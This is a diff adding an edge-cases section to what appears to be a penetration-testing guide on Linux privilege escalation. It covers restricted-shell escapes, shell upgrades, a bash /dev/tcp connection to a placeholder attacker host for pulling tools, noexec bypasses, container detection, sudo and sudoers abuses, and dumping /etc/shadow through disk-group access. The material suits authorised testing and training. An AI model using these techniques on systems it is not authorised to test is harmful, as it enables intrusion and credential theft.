@@ -125,6 +125,63 @@ grep -R "" /etc/cron* 2>/dev/null
 !!! opsec "Kernel exploits are risky"
     They can crash the target and are noisy. Prefer misconfig-based privesc; keep kernel exploits as a last resort and note the reboot risk in your report.
 
+## :material-alert-decagram: Edge cases & gotchas
+
+!!! bug "SUID bash gives you nothing without `-p`"
+    `bash`/`sh` **drop** the effective UID on startup unless you pass `-p`. A SUID
+    shell, an `execve("/bin/sh")` from a SUID binary, and shells spawned by cron all
+    need `bash -p` (or use `/bin/sh -p`). This is the single most common "I have the
+    exploit but I'm still not root" mistake.
+
+=== "First break out of the box"
+
+    Enumeration assumes a normal shell. If you don't have one yet:
+
+    - **Restricted shell (rbash/rksh):** escape before privesc —
+      `vi` → `:set shell=/bin/bash` → `:shell`; or `bash --noprofile`; or any
+      allowed binary with a shell escape (GTFOBins). Also check `$PATH`, and try
+      `ssh target -t "bash --noprofile"`.
+    - **No TTY:** upgrade with
+      `python3 -c 'import pty;pty.spawn("/bin/bash")'`, then
+      `Ctrl-Z` → `stty raw -echo; fg` → `export TERM=xterm` for a usable shell.
+
+=== "linpeas won't run"
+
+    - **No `curl`/`wget`:** `exec 3<>/dev/tcp/ATTACKER/80` bash TCP, or paste the
+      script, or fall back to manual one-liners.
+    - **`noexec` on `/tmp`:** run scripts via the interpreter instead of executing
+      (`bash script.sh`, `sh < script.sh`), or write to a mounted-exec path
+      (`/dev/shm` is often exec-able, or your home dir).
+    - **Nothing writable:** everything above still works from stdin; for binaries,
+      `/lib64/ld-linux-x86-64.so.2 ./binary` runs a non-exec file.
+
+=== "Am I even on real metal?"
+
+    Escape depends on *where* you are — check before you dig:
+    ```bash
+    ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup     # docker/k8s?
+    systemd-detect-virt 2>/dev/null                        # vm / container type
+    cat /proc/1/sched | head -1                            # pid 1 == container?
+    capsh --print                                          # dropped caps == container
+    ```
+    In a container the "privesc" is a **container escape** (privileged flag,
+    mounted docker.sock, `SYS_ADMIN` cap, host mounts) → see
+    [Container Escape](../cloud/containers.md), not a kernel root.
+
+!!! tip "The subtler misconfigs linpeas flags but people ignore"
+    - **Writable systemd unit / timer / `.socket`** (not just cron) run as root on
+      the next start — `systemctl` reload or wait for a reboot/timer.
+    - **`sudoedit`/`sudo` version** — `CVE-2023-22809` (`sudoedit` + `EDITOR`
+      symlink to edit *any* file), plus the Baron Samedit / `-u#-1` classics.
+    - **A wildcard or writable path in a sudoers rule** (`(root) /usr/bin/systemctl *`,
+      or a script in a writable dir) — you control the argument or the file.
+    - **Root-owned `tmux`/`screen` sockets** you can attach to (`SCREENDIR`,
+      `/tmp/tmux-0`).
+    - **`cron` runs with a minimal `PATH`** (`/usr/bin:/bin`) — a PATH hijack there
+      needs a writable dir that's actually *in that* PATH, not your login `$PATH`.
+    - **Group memberships:** `docker`, `lxd`, `disk` (raw read `/dev/sda` → dump
+      `/etc/shadow`), `adm` (read all logs), `shadow`, `video`.
+
 ## :material-link-variant: Related
 
 - Arrived from [File Upload](../web/file-upload.md) / [SQLi](../web/sqli.md) / [Deserialization](../web/deserialization.md).
